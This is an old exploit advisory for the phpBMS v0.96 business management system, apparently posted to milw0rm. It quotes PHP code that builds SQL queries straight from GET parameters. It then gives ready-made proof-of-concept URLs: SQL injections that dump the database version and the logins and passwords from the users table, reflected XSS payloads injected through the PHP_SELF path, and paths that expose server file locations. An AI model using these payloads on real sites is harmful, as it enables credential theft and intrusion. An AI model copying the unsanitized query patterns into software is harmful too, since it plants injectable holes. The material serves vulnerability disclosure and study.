@@ -1,0 +1,68 @@
+phpBMS v0.96
+phpbms.org
+
+eLwaux(c)2009, uasc.org.ua
+http://phpbms.org/trial/
+
+
+## ## ##
+SQL Inj
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	$querystatement="SELECT
+if(discounts.type+0=1,concat(discounts.value,\"%\"),discounts.value)
+                  AS value FROM discounts WHERE id=".$_GET["id"];
+	$queryresult = $db->query($querystatement);
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+PoC: /modules/bms/invoices_discount_ajax.php?id=-1+union+select+concat_ws(0x3a,version(),user(),database())
+
+
+
+## ## ##
+SQL Inj
+\dbgraphic.php
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+        $querystatement="SELECT ".$_GET["f"].",".$_GET["mf"]." FROM
+".$_GET["t"]." WHERE id=".$_GET["r"];
+	$queryresult=$db->query($querystatement);
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+PoC: \dbgraphic.php?f=concat_ws(id,login,password)&mf=1&t=users&r=1
+
+
+## ## ##
+SQL Inj
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	if(isset($_GET["cmd"])){
+		switch($_GET["cmd"]){
+			case "show":
+				showSearch($_GET["tid"],$_GET["base"],$db);
+			break;
+		}//end switch
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+PoC:
+	/advancedsearch.php?cmd=show&tid=-1+union+select+login+from+users&base=2
+	/advancedsearch.php?cmd=show&tid=-1+union+select+password+from+users&base=2
+
+
+## ## ##
+pXSS
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+        <form name="form1" method="post" action="<?php echo
+$_SERVER["PHP_SELF"]?>">
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+PoC:
+     \index.php/"><script>alert(/xss/);</script><div id="
+     \modules\base\myaccount.php/"><script>alert(/xss/);</script><div id="
+     \phpbms\modules\base\modules_view.php"><script>alert(/xss/);</script><div
+id="
+     \phpbms\modules\base\tabledefs_options.php\">{XSS}
+     \phpbms\modules\base\adminsettings.php\">{XSS}
+
+
+## ## ##
+Path Disclosure
+     /footer.php
+     /header.php
+     /advancedsearch.php?cmd=show&
+     /choicelist.php
+
+# milw0rm.com [2009-07-10]
